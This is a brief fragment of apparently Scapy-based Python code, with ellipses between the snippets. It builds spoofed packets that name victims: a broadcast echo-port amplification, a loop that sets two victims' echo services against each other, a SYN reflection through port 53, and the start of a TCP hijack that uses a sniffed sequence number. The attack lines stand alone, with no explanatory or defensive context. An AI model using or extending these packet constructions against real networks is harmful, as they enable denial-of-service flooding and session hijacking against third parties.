...
packet = IP(src=victim_ip, dst=broadcast_ip) / UDP(dport=7) 
...
packet = IP(src=victim_a_ip, dst=victim_b_ip) / UDP(dport=7) 
...
packet = IP(src=victim_ip, dst=reflector_ip) / TCP(dport=53, flags="S") # DNS port 
...
dest_ip = "10.0.0.5"
seq_num = 123456789 # sniffed from traffic
